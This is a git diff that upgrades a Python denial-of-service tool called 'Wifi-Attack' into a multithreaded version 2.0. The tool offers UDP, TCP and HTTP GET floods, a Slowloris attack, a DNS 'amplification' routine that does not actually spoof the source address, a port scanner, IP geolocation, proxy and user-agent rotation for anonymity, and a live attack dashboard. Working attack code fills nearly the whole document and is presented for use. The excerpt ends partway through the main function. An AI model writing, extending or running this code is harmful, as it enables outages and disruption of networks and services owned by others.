@@ -1,10 +1,19 @@
-# Module
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import os
+import sys
 import socket
 import random
 import time
+import threading
+import json
+import csv
+from datetime import datetime
+from colorama import init, Fore, Style
 import requests
-from colorama import init, Fore
+from speedtest import Speedtest
+import dns.resolver
 
 # ASCII Art Color 
 
@@ -20,110 +29,66 @@ from colorama import init, Fore
 # Initialize Colorama
 init(autoreset=True)
 
-# Set window title
-print(f"\033]0;Wifi-Attack V1\007", end="", flush=True)
+# ============================================
+# CONFIGURATION & SETTINGS
+# ============================================
+VERSION = "2.0"
+DEVELOPER = "Security Tool"
+WHITELIST = ['127.0.0.1']
+BLACKLIST = []
+CONFIG_FILE = "wifi_attack_config.json"
+RESULTS_FILE = "attack_results.txt"
 
-# ASCII Art
-ASCII_ART = """"""
+# ============================================
+# ASCII ART & UI
+# ============================================
+ASCII_ART = """
+""".format(VERSION=VERSION)
 
-# UDP Methods (Wifi-Attack)
-def udp_spam(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 666
-    payload = random.randbytes(packet_size)
-    print(Fore.CYAN + f"[🚀] UDP Spam Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock.sendto(payload, (ip, port))  # Overwhelm UDP Wifi-Attack (if enabled)
-            packet_count += 666
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    finally:
-        sock.close()
-        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")
+# ============================================
+# ATTACK STATISTICS CLASS
+# ============================================
+class AttackStats:
+    def __init__(self):
+        self.total_packets = 0
+        self.total_bytes = 0
+        self.start_time = None
+        self.packets_per_second = 0
+        self.active_threads = 0
+        self.target_status = "Unknown"
+        
+    def start(self):
+        self.start_time = time.time()
+        self.total_packets = 0
+        self.total_bytes = 0
+        
+    def update(self, packets, bytes_sent):
+        self.total_packets += packets
+        self.total_bytes += bytes_sent
+        if self.start_time:
+            elapsed = time.time() - self.start_time
+            if elapsed > 0:
+                self.packets_per_second = self.total_packets / elapsed
+    
+    def get_stats(self):
+        if not self.start_time:
+            return {}
+        
+        elapsed = time.time() - self.start_time
+        return {
+            'total_packets': self.total_packets,
+            'total_bytes': self.total_bytes,
+            'packets_per_second': self.packets_per_second,
+            'elapsed_time': elapsed,
+            'target_status': self.target_status
+        }
 
-def udp_handshake(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 666
-    handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)  # Fake handshake
-    print(Fore.CYAN + f"[🚀] UDP Handshake Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock.sendto(handshake, (ip, port))
-            packet_count += 666
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    finally:
-        sock.close()
-        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")
+# Global stats instance
+stats = AttackStats()
 
-def udp_query(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 666
-    query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)  # Wifi-Attack query
-    print(Fore.CYAN + f"[🚀] UDP Query Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock.sendto(query, (ip, port))
-            packet_count += 666
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    finally:
-        sock.close()
-        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} query packets.")
-
-
-# TCP Wifi-Attack Methods
-def tcp_connect(ip, port, duration, packet_size):
-    end_time = time.time() + duration
-    connection_count = 666
-    print(Fore.CYAN + f"[🚀] TCP Connect Wifi-Attack on {ip}:{port} | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect_ex((ip, port))  #1
-            connection_count += 666
-            sock.close()
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    print(Fore.GREEN + f"[✅] Done! Made {connection_count} connections.")
-
-def tcp_join(ip, port, duration, packet_size):
-    end_time = time.time() + duration
-    packet_count = 666
-    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)  #2
-    print(Fore.CYAN + f"[🚀] TCP Join Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sock.send(handshake)
-            packet_count += 666
-            sock.close()
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} join packets.")
-
-def tcp_login(ip, port, duration, packet_size):
-    end_time = time.time() + duration
-    packet_count = 666
-    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)  #3
-    print(Fore.CYAN + f"[🚀] TCP Login Wifi-Attack on {ip}:{port} | {packet_size} bytes | {duration}s...")
-    try:
-        while time.time() < end_time:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sock.send(login)
-            packet_count += 666
-            sock.close()
-    except Exception as e:
-        print(Fore.RED + f"[❌] Error: {e}")
-    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} login attempts.")
-
-# Validation Function
+# ============================================
+# VALIDATION & SECURITY FUNCTIONS
+# ============================================
 def validate_input(prompt, min_val, max_val, input_type=int, default=None):
     while True:
         try:
@@ -137,83 +102,772 @@ def validate_input(prompt, min_val, max_val, input_type=int, default=None):
         except ValueError:
             print(Fore.RED + "[❌] Invalid input! Numbers only.")
 
-# Main Menu
+def is_target_allowed(ip):
+    if ip in WHITELIST:
+        print(Fore.YELLOW + f"[⚠️] Warning: {ip} is in whitelist! Attack blocked.")
+        return False
+    if ip in BLACKLIST:
+        print(Fore.RED + f"[❌] Error: {ip} is in blacklist!")
+        return False
+    return True
 
-os.system("clear")
-
-def main():
-    print(Fore.YELLOW + ASCII_ART)
-    print(Fore.LIGHTBLUE_EX + "🔹  \033[97mWifi Attack Methods  🔹")
-    print("\033[94m____________________________\033[97m")
-    print("")
-    print("  \033[90m[1].\033[97m \033[91m{UDP} Wifi-Attack\033[97m")
-    print("")
-    print("  \033[90m[2].\033[97m \033[91m{TCP} Wifi-Attack\033[97m")
-    print("")
-    attack_type = input(Fore.LIGHTBLUE_EX + "\033[97mSelect attack type (1-2): \033[91m").strip()
-
-    print("")
-    ip = input(Fore.LIGHTBLUE_EX + "\033[97mEnter IP Gateway Wifi: \033[91m")
-    print("")
-    port = validate_input("\033[97mEnter port (default: 80): \033[91m", 80, 443, default=80)
-    print("")
-    duration = validate_input("\033[97mEnter duration (default: 1000): \033[91m", 1, float('inf'), float)
-    print("")
-
-    if attack_type == "1":  # UDP Wifi-Attack
-        print("")
-        os.system("clear")
-        print(Fore.LIGHTBLUE_EX + "🔹  \033[97mWifi Attack UDP Methods  🔹")
-        print("\033[94m_______________________________\033[97m")
-        print("")
-        print("")
-        print("  \033[90m[1].\033[97m \033[91mUDP Spam Wifi-Attack\033[90m")
-        print("")
-        print("  \033[90m[2].\033[97m \033[91mUDP Handshake Wifi-Attack\033[97m")
-        print("")
-        print("  \033[90m[3].\033[97m \033[91mUDP Query Wifi-Attack\033[97m")
-        print("")
-        print("")
-        method = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (1-3): \033[91m").strip()
-        print("")
-        packet_size = validate_input("\033[97mEnter packet size (1-5000): \033[91m", 1, 65500)
-
-        methods = {
-            "1": udp_spam, "2": udp_handshake, "3": udp_query
-        }
-        if method in methods:
-            methods[method](ip, port, duration, packet_size)
+def validate_target(ip, port):
+    try:
+        print(Fore.CYAN + f"[🔍] Checking target {ip}:{port}...")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((ip, port))
+        sock.close()
+        
+        if result == 0:
+            stats.target_status = "Online"
+            print(Fore.GREEN + f"[✅] Target {ip}:{port} is online!")
+            return True
         else:
-            print(Fore.RED + "[❌] Invalid UDP Wifi-Attack method!")
-            print("")
+            stats.target_status = "Offline/Blocked"
+            print(Fore.YELLOW + f"[⚠️] Target {ip}:{port} may be offline or blocking connections")
+            return True  # Still allow attack if user wants
+    except Exception as e:
+        print(Fore.RED + f"[❌] Connection test failed: {e}")
+        return False
 
-    elif attack_type == "2":  # TCP Wifi-Attack
-        print("")
-        os.system("clear")
-        print(Fore.LIGHTBLUE_EX + "\033[97m🔹  Wifi Attack TCP Methods  🔹")
-        print("\033[94m_______________________________\033[97m")
-        print("")
-        print("")
-        print("  \033[90m[1].\033[97m \033[91mTCP Connect Wifi-Attack\033[97m")
-        print("")
-        print("  \033[90m[2].\033[97m \033[91mTCP Join Wifi-Attack\033[97m")
-        print("")
-        print("  \033[90m[3].\033[97m \033[91mTCP Login Wifi-Attack\033[97m")
-        print("")
-        print("")
-        method = input(Fore.LIGHTBLUE_EX + "\033[97mSelect method (1-3): \033[91m").strip()
-        packet_size = validate_input("\033[97mEnter packet size (1-5000): \033[91m", 1, 65500)
+def get_ip_location(ip):
+    try:
+        print(Fore.CYAN + f"[🌍] Getting location for {ip}...")
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data['status'] == 'success':
+                return {
+                    'country': data.get('country', 'Unknown'),
+                    'city': data.get('city', 'Unknown'),
+                    'isp': data.get('isp', 'Unknown'),
+                    'org': data.get('org', 'Unknown')
+                }
+    except:
+        pass
+    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}
 
-        methods = {
-            "1": tcp_connect, "2": tcp_join, "3": tcp_login
-        }
-        if method in methods:
-            methods[method](ip, port, duration, packet_size)
-        else:
-            print(Fore.RED + "[❌] Invalid TCP Wifi-Attack method!")
+def test_connection_speed():
+    try:
+        print(Fore.CYAN + "[📊] Testing connection speed...")
+        st = Speedtest()
+        download_speed = st.download() / 1_000_000  # Convert to Mbps
+        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
+        
+        print(Fore.GREEN + f"[✅] Download Speed: {download_speed:.2f} Mbps")
+        print(Fore.GREEN + f"[✅] Upload Speed: {upload_speed:.2f} Mbps")
+        
+        if upload_speed < 5:
+            print(Fore.YELLOW + "[⚠️] Warning: Low upload speed may affect attack effectiveness")
+        
+        return download_speed, upload_speed
+    except:
+        print(Fore.YELLOW + "[⚠️] Speed test unavailable")
+        return 0, 0
 
+# ============================================
+# PROXY & ANONYMITY FUNCTIONS
+# ============================================
+PROXY_LIST = [
+    'proxy1.example.com:8080',
+    'proxy2.example.com:3128',
+    # Add more proxies here
+]
+
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+]
+
+def get_random_user_agent():
+    return random.choice(USER_AGENTS)
+
+def get_random_proxy():
+    if PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
+
+# ============================================
+# ATTACK METHODS - ENHANCED WITH MULTI-THREADING
+# ============================================
+def threaded_attack(target_func, ip, port, duration, packet_size, thread_count=5):
+    threads = []
+    stats.active_threads = thread_count
+    
+    def attack_worker(worker_id):
+        try:
+            target_func(ip, port, duration, packet_size, worker_id)
+        except Exception as e:
+            print(Fore.RED + f"[❌] Thread {worker_id} error: {e}")
+    
+    print(Fore.CYAN + f"[⚡] Starting {thread_count} attack threads...")
+    for i in range(thread_count):
+        t = threading.Thread(target=attack_worker, args=(i+1,))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+    
+    # Wait for all threads or duration
+    start_time = time.time()
+    while time.time() - start_time < duration and any(t.is_alive() for t in threads):
+        time.sleep(0.1)
+    
+    stats.active_threads = 0
+    print(Fore.GREEN + f"[✅] All attack threads completed!")
+
+# UDP Attack Methods
+def udp_spam(ip, port, duration, packet_size, thread_id=1):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(0.5)
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Spam on {ip}:{port} | Size: {packet_size} bytes")
+    
+    try:
+        while time.time() < end_time:
+            payload = random.randbytes(packet_size)
+            try:
+                sock.sendto(payload, (ip, port))
+                local_packet_count += 1
+                stats.update(1, packet_size)
+            except:
+                break
+            
+            # Rate limiting for stability
+            if local_packet_count % 100 == 0:
+                time.sleep(0.01)
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+    finally:
+        sock.close()
+        print(Fore.GREEN + f"[✅] Thread-{thread_id}: Sent {local_packet_count} packets")
+
+def udp_handshake(ip, port, duration, packet_size, thread_id=1):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Handshake on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
+            try:
+                sock.sendto(handshake, (ip, port))
+                local_packet_count += 1
+                stats.update(1, packet_size)
+            except:
+                break
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+    finally:
+        sock.close()
+
+def udp_query(ip, port, duration, packet_size, thread_id=1):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Query on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
+            try:
+                sock.sendto(query, (ip, port))
+                local_packet_count += 1
+                stats.update(1, packet_size)
+            except:
+                break
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+    finally:
+        sock.close()
+
+# TCP Attack Methods
+def tcp_connect(ip, port, duration, packet_size, thread_id=1):
+    end_time = time.time() + duration
+    local_connection_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Connect on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((ip, port))
+                if result == 0:
+                    local_connection_count += 1
+                    stats.update(1, 40)  # Approx TCP header size
+                sock.close()
+            except:
+                pass
+            
+            # Prevent overwhelming system
+            if local_connection_count % 50 == 0:
+                time.sleep(0.01)
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+
+def tcp_join(ip, port, duration, packet_size, thread_id=1):
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Join on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                sock.connect((ip, port))
+                handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
+                sock.send(handshake)
+                local_packet_count += 1
+                stats.update(1, packet_size)
+                sock.close()
+            except:
+                pass
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+
+def tcp_login(ip, port, duration, packet_size, thread_id=1):
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Login on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                sock.connect((ip, port))
+                login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
+                sock.send(login)
+                local_packet_count += 1
+                stats.update(1, packet_size)
+                sock.close()
+            except:
+                pass
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+
+# NEW ATTACK METHODS
+def http_flood(ip, port, duration, path="/", thread_id=1):
+    end_time = time.time() + duration
+    local_request_count = 0
+    headers = {'User-Agent': get_random_user_agent()}
+    
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: HTTP Flood on {ip}:{port}")
+    
+    try:
+        while time.time() < end_time:
+            try:
+                response = requests.get(f"http://{ip}:{port}{path}", 
+                                      headers=headers, 
+                                      timeout=2,
+                                      verify=False)
+                local_request_count += 1
+                stats.update(1, len(response.content))
+            except:
+                pass
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+
+def slowloris_attack(ip, port, duration, thread_id=1):
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: Slowloris on {ip}:{port}")
+    
+    sockets = []
+    try:
+        # Create many sockets
+        for i in range(150):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect((ip, port))
+                s.send(f"GET / HTTP/1.1\r\n".encode())
+                sockets.append(s)
+                stats.update(1, 20)
+            except:
+                pass
+        
+        # Keep them open
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            for s in sockets:
+                try:
+                    s.send(f"X-a: b\r\n".encode())
+                    time.sleep(10)  # Send header slowly
+                except:
+                    sockets.remove(s)
+            time.sleep(1)
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+    finally:
+        # Close all sockets
+        for s in sockets:
+            try:
+                s.close()
+            except:
+                pass
+
+def dns_amplification(ip, duration, thread_id=1):
+    print(Fore.CYAN + f"[🚀] Thread-{thread_id}: DNS Amplification targeting {ip}")
+    
+    dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9', '202.95.128.180']
+    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
+    query += b'\x07example\x03com\x00\x00\x01\x00\x01'
+    
+    end_time = time.time() + duration
+    local_packet_count = 0
+    
+    try:
+        while time.time() < end_time:
+            dns_server = random.choice(dns_servers)
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(query, (dns_server, 53))
+                local_packet_count += 1
+                stats.update(1, len(query))
+                sock.close()
+            except:
+                pass
+    except Exception as e:
+        print(Fore.RED + f"[❌] Thread-{thread_id} Error: {e}")
+
+# ============================================
+# MONITORING & DASHBOARD
+# ============================================
+def live_dashboard():
+    os.system('clear')
+    print(Fore.CYAN + "="*60)
+    print(Fore.YELLOW + "LIVE ATTACK DASHBOARD")
+    print(Fore.CYAN + "="*60)
+    
+    stats_data = stats.get_stats()
+    if stats_data:
+        print(f"{Fore.GREEN}Target Status: {stats.target_status}")
+        print(f"{Fore.CYAN}Packets Sent: {stats_data['total_packets']:,}")
+        print(f"{Fore.CYAN}Bytes Sent: {stats_data['total_bytes']:,} ({stats_data['total_bytes']/1024/1024:.2f} MB)")
+        print(f"{Fore.CYAN}Packets/Second: {stats_data['packets_per_second']:.2f}")
+        print(f"{Fore.CYAN}Elapsed Time: {stats_data['elapsed_time']:.2f}s")
+        print(f"{Fore.CYAN}Active Threads: {stats.active_threads}")
     else:
-        print(Fore.RED + "[❌] Invalid attack type!")
+        print(f"{Fore.YELLOW}No attack running...")
+    
+    print(Fore.CYAN + "="*60)
+    print(Fore.YELLOW + "Press Ctrl+C to stop attack")
+    print(Fore.CYAN + "="*60)
 
+def start_monitor(interval=2):
+    def monitor():
+        while stats.active_threads > 0:
+            live_dashboard()
+            time.sleep(interval)
+    
+    monitor_thread = threading.Thread(target=monitor)
+    monitor_thread.daemon = True
+    monitor_thread.start()
+    return monitor_thread
+
+# ============================================
+# CONFIGURATION MANAGEMENT
+# ============================================
+def save_config(config_data):
+    try:
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(config_data, f, indent=4)
+        print(Fore.GREEN + f"[✅] Configuration saved to {CONFIG_FILE}")
+        return True
+    except Exception as e:
+        print(Fore.RED + f"[❌] Failed to save config: {e}")
+        return False
+
+def load_config():
+    try:
+        if os.path.exists(CONFIG_FILE):
+            with open(CONFIG_FILE, 'r') as f:
+                config = json.load(f)
+            print(Fore.GREEN + f"[✅] Configuration loaded from {CONFIG_FILE}")
+            return config
+    except Exception as e:
+        print(Fore.RED + f"[❌] Failed to load config: {e}")
+    return None
+
+def save_results(attack_data):
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        attack_data['timestamp'] = timestamp
+        
+        # Save to JSON
+        with open("attack_results.json", 'a') as f:
+            json.dump(attack_data, f)
+            f.write("\n")
+        
+        # Save to text file
+        with open(RESULTS_FILE, 'a') as f:
+            f.write(f"\n{'='*60}\n")
+            f.write(f"Attack Results - {timestamp}\n")
+            f.write(f"{'='*60}\n")
+            for key, value in attack_data.items():
+                f.write(f"{key}: {value}\n")
+        
+        print(Fore.GREEN + f"[✅] Results saved to {RESULTS_FILE}")
+    except Exception as e:
+        print(Fore.RED + f"[❌] Failed to save results: {e}")
+
+# ============================================
+# MAIN MENU & INTERFACE
+# ============================================
+def print_banner():
+    os.system('clear')
+    print(ASCII_ART)
+    
+def show_main_menu():
+    print(Fore.LIGHTBLUE_EX + "\033[92m        🔹  MAIN MENU  🔹        \033[97m")
+    print("\033[94m" + "="*32 + "\033[97m")
+    print("")
+    print("  \033[90m[1]\033[97m \033[91mNetwork Attack Methods\033[97m")
+    print("")
+    print("  \033[90m[2]\033[97m \033[91mTarget Information\033[97m")
+    print("")
+    print("  \033[90m[3]\033[97m \033[91mConnection Speed Test\033[97m")
+    print("")
+    print("  \033[90m[4]\033[97m \033[91mLoad/Save Configuration\033[97m")
+    print("")
+    print("  \033[90m[5]\033[97m \033[91mView Previous Results\033[97m")
+    print("")
+    print("  \033[90m[6]\033[97m \033[91mSettings & Whitelist\033[97m")
+    print("")
+    print("  \033[90m[0]\033[97m \033[91mExit\033[97m")
+    print("")
+    
+    choice = input(Fore.LIGHTBLUE_EX + "Select option (0-6): " + Fore.YELLOW).strip()
+    return choice
+
+def show_attack_menu():
+    print_banner()
+    print(Fore.LIGHTBLUE_EX + "🔹  ATTACK METHODS  🔹")
+    print("\033[94m" + "="*40 + "\033[97m")
+    print()
+    print(Fore.YELLOW + "[UDP ATTACKS]")
+    print("  \033[90m[1]\033[97m UDP Spam Flood")
+    print("  \033[90m[2]\033[97m UDP Handshake Flood")
+    print("  \033[90m[3]\033[97m UDP Query Flood")
+    print()
+    print(Fore.YELLOW + "[TCP ATTACKS]")
+    print("  \033[90m[4]\033[97m TCP Connect Flood")
+    print("  \033[90m[5]\033[97m TCP Join Flood")
+    print("  \033[90m[6]\033[97m TCP Login Flood")
+    print()
+    print(Fore.YELLOW + "[ADVANCED ATTACKS]")
+    print("  \033[90m[7]\033[97m HTTP GET Flood")
+    print("  \033[90m[8]\033[97m Slowloris Attack")
+    print("  \033[90m[9]\033[97m DNS Amplification")
+    print("  \033[90m[0]\033[97m Back to Main Menu")
+    print()
+    
+    choice = input(Fore.LIGHTBLUE_EX + "Select method (0-9): " + Fore.YELLOW).strip()
+    return choice
+
+def get_attack_parameters():
+    print()
+    print(Fore.LIGHTBLUE_EX + "🔹  ATTACK PARAMETERS  🔹")
+    print("\033[94m" + "="*40)
+    
+    # Target IP
+    while True:
+        ip = input(Fore.LIGHTBLUE_EX + "Target IP: " + Fore.YELLOW).strip()
+        if ip:
+            if not is_target_allowed(ip):
+                continue
+            break
+    
+    # Port
+    port = validate_input("Target Port (1-65535, default 80): ", 1, 65535, default=80)
+    
+    # Duration
+    duration = validate_input("Duration in seconds (1-3600): ", 1, 3600, float, default=30)
+    
+    # Packet size
+    packet_size = validate_input("Packet size in bytes (1-65500): ", 1, 65500, default=1024)
+    
+    # Thread count
+    thread_count = validate_input("Thread count (1-50, default 5): ", 1, 50, default=5)
+    
+    return {
+        'ip': ip,
+        'port': port,
+        'duration': duration,
+        'packet_size': packet_size,
+        'thread_count': thread_count
+    }
+
+def run_attack(method_choice, params):
+    attack_methods = {
+        '1': (udp_spam, "UDP Spam Flood"),
+        '2': (udp_handshake, "UDP Handshake Flood"),
+        '3': (udp_query, "UDP Query Flood"),
+        '4': (tcp_connect, "TCP Connect Flood"),
+        '5': (tcp_join, "TCP Join Flood"),
+        '6': (tcp_login, "TCP Login Flood"),
+        '7': (http_flood, "HTTP GET Flood"),
+        '8': (slowloris_attack, "Slowloris Attack"),
+        '9': (dns_amplification, "DNS Amplification")
+    }
+    
+    if method_choice in attack_methods:
+        method_func, method_name = attack_methods[method_choice]
+        
+        print()
+        print(Fore.YELLOW + "="*60)
+        print(Fore.RED + f"STARTING {method_name}")
+        print(Fore.YELLOW + "="*60)
+        print(Fore.CYAN + f"Target: {params['ip']}:{params['port']}")
+        print(Fore.CYAN + f"Duration: {params['duration']} seconds")
+        print(Fore.CYAN + f"Threads: {params['thread_count']}")
+        print(Fore.YELLOW + "="*60)
+        
+        # Validate target first
+        if not validate_target(params['ip'], params['port']):
+            confirm = input(Fore.YELLOW + "[⚠️] Target may be offline. Continue? (y/n): ").lower()
+            if confirm != 'y':
+                return None
+        
+        # Start monitoring
+        stats.start()
+        monitor_thread = start_monitor()
+        
+        # Start attack with threading
+        try:
+            threaded_attack(
+                method_func,
+                params['ip'],
+                params['port'],
+                params['duration'],
+                params['packet_size'],
+                params['thread_count']
+            )
+        except KeyboardInterrupt:
+            print(Fore.YELLOW + "\n[⚠️] Attack interrupted by user!")
+        except Exception as e:
+            print(Fore.RED + f"[❌] Attack failed: {e}")
+        
+        # Final statistics
+        final_stats = stats.get_stats()
+        if final_stats:
+            print()
+            print(Fore.GREEN + "="*60)
+            print(Fore.GREEN + "ATTACK COMPLETED SUCCESSFULLY!")
+            print(Fore.GREEN + "="*60)
+            print(Fore.CYAN + f"Total Packets: {final_stats['total_packets']:,}")
+            print(Fore.CYAN + f"Total Data: {final_stats['total_bytes']/1024/1024:.2f} MB")
+            print(Fore.CYAN + f"Average Speed: {final_stats['packets_per_second']:.2f} packets/sec")
+            print(Fore.CYAN + f"Duration: {final_stats['elapsed_time']:.2f} seconds")
+            print(Fore.GREEN + "="*60)
+        
+        return final_stats
+    else:
+        print(Fore.RED + "[❌] Invalid attack method!")
+        return None
+
+# ============================================
+# ADDITIONAL FEATURES
+# ============================================
+def show_target_info():
+    print_banner()
+    print(Fore.LIGHTBLUE_EX + "🔹  TARGET INFORMATION  🔹")
+    print("\033[94m" + "="*40)
+    
+    ip = input(Fore.LIGHTBLUE_EX + "Enter IP address: " + Fore.YELLOW).strip()
+    if not ip:
+        return
+    
+    print()
+    print(Fore.CYAN + "[🔍] Gathering information...")
+    
+    # Get location
+    location = get_ip_location(ip)
+    if location:
+        print(Fore.GREEN + f"Country: {location['country']}")
+        print(Fore.GREEN + f"City: {location['city']}")
+        print(Fore.GREEN + f"ISP: {location['isp']}")
+        print(Fore.GREEN + f"Organization: {location['org']}")
+    
+    # Check common ports
+    print()
+    print(Fore.CYAN + "[🔍] Scanning common ports...")
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080, 8443]
+    
+    open_ports = []
+    for port in common_ports[:10]:  # Limit to first 10 for speed
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip, port))
+            if result == 0:
+                open_ports.append(port)
+            sock.close()
+        except:
+            pass
+    
+    if open_ports:
+        print(Fore.GREEN + f"Open ports: {', '.join(map(str, open_ports))}")
+    else:
+        print(Fore.YELLOW + "No common ports open (or filtered)")
+    
+    input(Fore.CYAN + "\nPress Enter to continue...")
+
+def show_settings():
+    # Tambahkan deklarasi global di sini
+    global WHITELIST, BLACKLIST
+    
+    print_banner()
+    print(Fore.LIGHTBLUE_EX + "🔹  SETTINGS & CONFIGURATION  🔹")
+    print("\033[94m" + "="*40)
+    
+    print()
+    print(Fore.YELLOW + "[1] View Whitelist")
+    print(Fore.YELLOW + "[2] Add to Whitelist")
+    print(Fore.YELLOW + "[3] Remove from Whitelist")
+    print(Fore.YELLOW + "[4] View Blacklist")
+    print(Fore.YELLOW + "[5] Back to Main")
+    
+    choice = input(Fore.LIGHTBLUE_EX + "\nSelect option: " + Fore.YELLOW).strip()
+    
+    if choice == '1':
+        print(Fore.GREEN + f"\nWhitelist: {WHITELIST}")
+    elif choice == '2':
+        ip = input(Fore.CYAN + "IP to whitelist: ").strip()
+        if ip and ip not in WHITELIST:
+            WHITELIST.append(ip)
+            print(Fore.GREEN + f"[✅] Added {ip} to whitelist")
+    elif choice == '3':
+        ip = input(Fore.CYAN + "IP to remove: ").strip()
+        if ip in WHITELIST:
+            WHITELIST.remove(ip)
+            print(Fore.GREEN + f"[✅] Removed {ip} from whitelist")
+    
+    input(Fore.CYAN + "\nPress Enter to continue...")
+
+# ============================================
+# MAIN APPLICATION
+# ============================================
+def main():
+    # Deklarasikan global di awal fungsi
+    global WHITELIST, BLACKLIST
+    
+    print_banner()
+
+    # Main loop
+    while True:
+        print_banner()
+        choice = show_main_menu()
+        
+        if choice == '0':
